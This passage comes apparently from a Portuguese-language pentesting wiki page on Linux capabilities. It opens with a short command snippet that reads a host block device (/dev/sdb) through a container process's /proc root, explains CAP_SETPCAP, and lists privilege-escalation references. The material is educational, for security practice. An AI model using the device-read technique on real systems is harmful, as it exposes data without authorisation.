# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Essa abordagem permite que o usuário padrão acesse e potencialmente leia dados de `/dev/sdb` por meio do container, explorando user namespaces compartilhados e as permissões definidas no dispositivo.

### CAP_SETPCAP

**CAP_SETPCAP** permite que um processo **altere os capability sets** de outro processo, possibilitando a adição ou remoção de capabilities dos conjuntos effective, inheritable e permitted. No entanto, um processo só pode modificar capabilities que possui em seu próprio permitted set, garantindo que não possa elevar os privilégios de outro processo além dos seus próprios. Atualizações recentes do kernel reforçaram essas regras, restringindo **CAP_SETPCAP** a apenas reduzir as capabilities dentro de seu próprio permitted set ou dos permitted sets de seus descendentes, com o objetivo de reduzir riscos de segurança. Seu uso requer ter **CAP_SETPCAP** no effective set e as capabilities-alvo no permitted set, utilizando `capset()` para realizar modificações. Isso resume a função principal e as limitações de **CAP_SETPCAP**, destacando seu papel no gerenciamento de privilégios e no aprimoramento da segurança.

**`CAP_SETPCAP`** é uma Linux capability que permite que um processo **modifique os capability sets de outro processo**. Ela concede a capacidade de adicionar ou remover capabilities dos conjuntos effective, inheritable e permitted de outros processos. No entanto, existem certas restrições sobre como essa capability pode ser usada.

Um processo com **`CAP_SETPCAP`** **só pode conceder ou remover capabilities que estejam em seu próprio permitted capability set**. Em outras palavras, um processo não pode conceder uma capability a outro processo se não possuir essa capability. Essa restrição impede que um processo eleve os privilégios de outro processo além de seu próprio nível de privilégio.

Além disso, em versões recentes do kernel, a capability **`CAP_SETPCAP`** foi **ainda mais restringida**. Ela não permite mais que um processo modifique arbitrariamente os capability sets de outros processos. Em vez disso, **permite apenas que um processo reduza as capabilities em seu próprio permitted capability set ou no permitted capability set de seus descendentes**. Essa alteração foi introduzida para reduzir possíveis riscos de segurança associados à capability.

Para usar **`CAP_SETPCAP`** de forma eficaz, é necessário ter a capability em seu effective capability set e as capabilities-alvo em seu permitted capability set. Em seguida, é possível usar a system call `capset()` para modificar os capability sets de outros processos.

Em resumo, **`CAP_SETPCAP`** permite que um processo modifique os capability sets de outros processos, mas não pode conceder capabilities que ele próprio não possua. Além disso, devido a preocupações de segurança, sua funcionalidade foi limitada em versões recentes do kernel para permitir apenas a redução de capabilities em seu próprio permitted capability set ou nos permitted capability sets de seus descendentes.

## Referências

**A maioria desses exemplos foi retirada de alguns labs do** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), portanto, se você quiser praticar essas técnicas de privesc, recomendo esses labs.

**Outras referências**:

- [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
- [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​
{{#include ../../banners/hacktricks-training.md}}
